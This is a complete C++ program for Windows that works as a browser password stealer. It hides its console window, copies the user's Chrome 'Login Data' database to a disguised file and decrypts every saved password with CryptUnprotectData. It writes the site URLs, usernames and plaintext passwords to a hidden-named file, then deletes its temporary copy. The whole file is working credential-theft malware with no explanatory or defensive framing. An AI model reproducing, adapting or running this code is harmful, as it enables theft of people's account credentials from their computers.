#include <windows.h>
#include <string>
#include <fstream>
#include "sqlite3.h"
int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::string text, nl = "\n", originurl = "origin_url:", actionurl = "action_url:", usernamevalue = "username_value:", passwordvalue = "password_value:";
	{
		TCHAR username[100];
		DWORD size = 100;
		GetUserName((TCHAR*)username, &size);
		std::ifstream  src("C:\\Users\\" + std::string(username) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", std::ios::binary);
		std::ofstream  dst("..hc_pdob", std::ios::binary);
		dst << src.rdbuf();
		sqlite3 *db;
		sqlite3_open("..hc_pdob", &db);
		sqlite3_stmt *pStmt;
		sqlite3_prepare(db, "SELECT origin_url, action_url, username_value, password_value FROM logins", -1, &pStmt, 0);
		int rc = sqlite3_step(pStmt);
		std::string decryptedvalue;
		DATA_BLOB encryptedPass, decryptedPass;
		while (rc == SQLITE_ROW) {
			encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 3);
			encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);
			memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 3), (int)encryptedPass.cbData);
			CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
			decryptedvalue = (char*)decryptedPass.pbData;
			text += nl + originurl + (char*)sqlite3_column_text(pStmt, 0) + nl + actionurl + (char*)sqlite3_column_text(pStmt, 1) + nl + usernamevalue + (char*)sqlite3_column_text(pStmt, 2) + nl + passwordvalue + decryptedvalue + nl;
			decryptedvalue.clear();
			rc = sqlite3_step(pStmt);
		}
		sqlite3_finalize(pStmt);
		sqlite3_close(db);
	}
	std::ofstream file("files/..hc_pdxt", std::ios::app);
	file << text;
	file.close();
	remove("..hc_pdob");
}